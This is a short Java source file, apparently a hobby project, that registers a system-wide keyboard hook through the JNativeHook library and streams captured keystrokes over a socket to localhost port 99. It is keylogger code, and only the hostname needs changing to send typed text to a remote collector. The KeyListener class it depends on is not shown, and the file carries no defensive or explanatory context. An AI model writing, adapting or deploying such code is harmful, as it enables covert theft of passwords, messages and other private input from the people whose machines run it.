/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package jkl;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import org.jnativehook.GlobalScreen;

/**
 *
 * @author Henry
 */
public class JKL {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        String hostname = "localhost";
        int port = 99;
        try {
            Socket echoSocket = new Socket(hostname, port);
            OutputStream stream = echoSocket.getOutputStream();

            PrintWriter out = new PrintWriter(stream, true);

            GlobalScreen.registerNativeHook();
            GlobalScreen.getInstance().addNativeKeyListener(new KeyListener(stream));
            while (System.in.available() < 1) {
                
            }
            GlobalScreen.unregisterNativeHook();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
